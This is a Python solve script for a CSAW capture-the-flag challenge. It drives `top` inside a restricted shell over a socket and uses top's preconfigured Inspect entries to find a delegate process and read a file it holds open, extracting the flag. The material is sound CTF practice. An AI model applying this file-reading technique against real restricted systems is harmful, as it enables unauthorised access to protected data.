#!/usr/bin/env python3
# solve.py — CSAW "Processing all of That" (misc).
#
# Drives `top` inside the restricted shell over a raw socket, rendering the curses
# output with pyte, and uses top's preconfigured Inspect (Y) entries:
#   State -> finds the collector that names a delegate PID
#   Held  -> reads the file the delegate still holds open
#
# usage: solve.py [host] [port]        (pip install pyte)
import json, re, socket, sys, time
import pyte

HOST = sys.argv[1] if len(sys.argv) > 1 else "10.0.223.101"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
RIGHT = b"\x1bOC"          # application-mode right arrow (ESC [ C is ignored)
OPTIONS = ["NUMA", "State", "Env", "Held"]


class Term:
    def __init__(self):
        self.s = socket.create_connection((HOST, PORT))
        self.s.settimeout(0.3)
        self.scr = pyte.Screen(200, 60)
        self.st = pyte.ByteStream(self.scr)
        self.read(1)

    def read(self, t=1.0):
        end = time.time() + t
        while time.time() < end:
            try:
                d = self.s.recv(65536)
                if not d:
                    break
                self.st.feed(d)
            except socket.timeout:
                pass
        return [l.rstrip() for l in self.scr.display if l.strip()]

    def key(self, k, t=1.0):
        # one keypress per write: batched escape sequences count as a single key
        self.s.send(k)
        return self.read(t)

    def close(self):
        self.s.close()


def collectors():
    t = Term()
    lines = t.key(b"top\n", 1.5)
    t.close()
    return [int(l.split()[0]) for l in lines if re.search(r"\bcollect", l)]


def inspect(pid, option):
    """Return the body lines of top's Inspect view `option` for `pid`."""
    t = Term()
    t.key(b"top\n", 1.5)
    t.key(b"Y", 1.2)
    t.key(str(pid).encode() + b"\r", 1.2)
    for _ in range(OPTIONS.index(option)):
        t.key(RIGHT, 1.2)
    lines = t.key(b"\r", 2)
    t.close()
    for i, l in enumerate(lines):
        if l.startswith(option + ":"):
            return lines[i + 1:]
    return []


def main():
    pids = collectors()
    print(f"[*] collectors: {pids}")

    delegate = None
    for pid in pids:
        body = " ".join(inspect(pid, "State"))
        m = re.search(r"\{.*\}", body)
        if m:
            state = json.loads(m.group(0))
            print(f"[+] pid {pid} State: {state}")
            delegate = state.get("delegate")
            break
        print(f"[-] pid {pid}: no state")

    order = ([delegate] if delegate else []) + [p for p in pids if p != delegate]
    for pid in order:
        body = " ".join(inspect(pid, "Held"))
        m = re.search(r"csaw\{[^}]*\}", body)
        if m:
            print(f"[+] pid {pid} Held: {body}")
            print(f"[+] FLAG: {m.group(0)}")
            return
        print(f"[-] pid {pid}: nothing held")
    print("[!] flag not found")


if __name__ == "__main__":
    main()
